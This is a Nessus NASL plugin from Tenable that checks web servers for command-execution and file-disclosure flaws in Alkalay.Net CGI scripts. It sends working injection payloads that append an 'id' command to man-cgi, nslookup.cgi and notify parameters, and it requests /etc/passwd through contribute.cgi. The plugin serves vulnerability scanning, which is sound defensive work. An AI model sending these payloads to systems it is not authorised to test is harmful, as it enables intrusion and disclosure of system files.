#
# (C) Tenable Network Security
#


include("compat.inc");

if (description) {
  script_id(19780);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-3094", "CVE-2005-3095", "CVE-2005-3096", "CVE-2005-3097");
  script_bugtraq_id(14893);
  script_xref(name:"OSVDB", value:"19519");
  script_xref(name:"OSVDB", value:"19520");
  script_xref(name:"OSVDB", value:"19521");
  script_xref(name:"OSVDB", value:"19522");
  script_xref(name:"OSVDB", value:"19879");

  script_name(english:"Alkalay.Net Multiple Scripts Arbitrary Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that allows for arbitrary
command execution and file disclosure." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running at least one CGI script written
by Avi Alkalay that allows attackers to execute arbitrary commands or
read arbitrary files on the remote host subject to the privileges of
the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.cirt.net/advisories/alkalay.shtml" );
 script_set_attribute(attribute:"solution", value:
"Remove the affected scripts." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  summary["english"] = "Checks for arbitrary command execution vulnerabilities in multiple scripts from Alkalay.Net";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

# Try to exploit the various flaws.
#
# nb: these scripts use CGI.pm to parse parameters and that wants
#     to parse on ';' as well as '&'; we can get around this by
#     url encoding semicolons in the exploits that use them.

http_check_remote_code(
  extra_dirs:"",
  check_request:"/man-cgi?section=0&topic=ls%3bid",
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  port:port
);

http_check_remote_code(
  extra_dirs:"",
  check_request:"/nslookup.cgi?query=localhost%3bid&type=ANY&ns=",
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  port:port
);

http_check_remote_code(
  extra_dirs:"",
  check_request:'/notify?from=nessus"|id"',
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  port:port
);

foreach script (make_list("contribute.cgi", "contribute.pl")) {
  r = http_send_recv3(method:"GET", port:port,
    item:string(
      "/", script, "?", 
      "template=/etc/passwd&",
      "contribdir=.&",
      "plugin=", SCRIPT_NAME));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if there's an entry for root.
  if (egrep(string:res, pattern:"root:.+:0:")) {
    security_hole(port);
    exit(0);
  }
}
